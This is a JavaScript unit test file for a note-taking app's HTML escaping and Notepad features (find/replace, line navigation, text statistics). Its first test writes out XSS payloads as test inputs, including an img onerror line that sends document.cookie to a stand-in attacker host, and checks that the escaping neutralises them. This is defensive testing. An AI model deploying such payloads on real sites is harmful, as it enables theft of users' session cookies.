// test/notepad-and-security.test.js - Unit tests for XSS security sanitization and Notepad features
import test from 'node:test';
import assert from 'node:assert/strict';
import { AppFlowyStore, escapeHTML } from '../src/store.js';
import { NotepadView } from '../src/components/notepad.js';
import { pageToMarkdown, markdownToBlocks } from '../src/components/io.js';

test('Security: escapeHTML neutralizes XSS vectors, injection strings, and null inputs', () => {
  // 1. Script injection
  const scriptTag = "<script>alert('pwned')</script>";
  assert.equal(escapeHTML(scriptTag), '&lt;script&gt;alert(&#39;pwned&#39;)&lt;/script&gt;');

  // 2. Image tag with onerror
  const imgPayload = '<img src=x onerror="fetch(`https://attacker.com?k=`+document.cookie)">';
  assert.equal(escapeHTML(imgPayload), '&lt;img src=x onerror=&quot;fetch(`https://attacker.com?k=`+document.cookie)&quot;&gt;');

  // 3. HTML attributes and quotes
  const attrPayload = '" onclick="maliciousCode()" data-test=\'attack\' &';
  assert.equal(escapeHTML(attrPayload), '&quot; onclick=&quot;maliciousCode()&quot; data-test=&#39;attack&#39; &amp;');

  // 4. Safe handles null and undefined
  assert.equal(escapeHTML(null), '');
  assert.equal(escapeHTML(undefined), '');
  assert.equal(escapeHTML(''), '');

  // 5. Standard text remains legible
  assert.equal(escapeHTML('Project Roadmap 2026'), 'Project Roadmap 2026');
});

test('Notepad Feature: Plain text page creation and bidirectional markdown sync', () => {
  const store = new AppFlowyStore();

  // Create a notepad-type page
  const npPage = store.createPage({
    title: 'Server Configuration Log',
    type: 'notepad',
    icon: '📝'
  });

  assert.ok(npPage);
  assert.equal(npPage.type, 'notepad');
  assert.equal(npPage.icon, '📝');

  // Multi-line notepad text content
  const sampleLog = `PORT=8080
HOST=127.0.0.1
DEBUG=true
MAX_CONNECTIONS=5000`;

  // Parse into blocks as Notepad does on save
  const blocks = markdownToBlocks(sampleLog);
  assert.ok(blocks.length >= 4);

  store.updatePage(npPage.id, { blocks });
  const updatedPage = store.getPage(npPage.id);
  assert.equal(updatedPage.blocks.length, blocks.length);

  // Roundtrip back to plain text
  const exported = pageToMarkdown(updatedPage);
  assert.ok(exported.includes('PORT=8080'));
  assert.ok(exported.includes('HOST=127.0.0.1'));
  assert.ok(exported.includes('MAX_CONNECTIONS=5000'));
});

test('Notepad Feature: Find, Replace, and Replace All logic', () => {
  const text = 'Quick brown fox jumps over the lazy dog. The fox is clever.';
  const query = 'fox';
  const replacement = 'wolf';

  // Replace All using Notepad regex engine
  const regex = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
  const count = (text.match(regex) || []).length;
  assert.equal(count, 2);

  const replaced = text.replace(regex, replacement);
  assert.equal(replaced, 'Quick brown wolf jumps over the lazy dog. The wolf is clever.');
  assert.equal(replaced.includes('fox'), false);

  // Case-sensitive find
  const caseSensitiveQuery = 'The';
  const csRegex = new RegExp(caseSensitiveQuery, 'g');
  const csCount = (text.match(csRegex) || []).length;
  assert.equal(csCount, 1); // Only capital 'The' matched
});

test('Notepad Feature: Go To Line cursor index calculation', () => {
  const content = 'First line\nSecond line\nThird line\nFourth line\nFifth line';
  const lines = content.split('\n');

  // Compute cursor position for line 3
  const targetLine = 3;
  let pos = 0;
  for (let i = 0; i < targetLine - 1; i++) {
    pos += lines[i].length + 1;
  }

  assert.equal(content.substring(pos, pos + 10), 'Third line');
});

test('Notepad Feature: Word, Line, and Character statistics calculation', () => {
  const noteBody = `Hello world from NoteTrack!
This is a test of the Notepad statistics engine.
Line 3 has five words.`;

  const totalChars = noteBody.length;
  const totalLines = noteBody.split('\n').length;
  const words = noteBody.trim().split(/\s+/).length;

  assert.equal(totalLines, 3);
  assert.equal(words, 18);
  assert.ok(totalChars > 70);
});

test('Notepad Feature: Time/Date F5 format validation', () => {
  const now = new Date();
  const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  const dateStr = now.toLocaleDateString();
  const timeDate = `${timeStr} ${dateStr}`;

  assert.ok(timeDate.length >= 8);
  assert.ok(timeDate.includes(':') || timeDate.includes(dateStr));
});
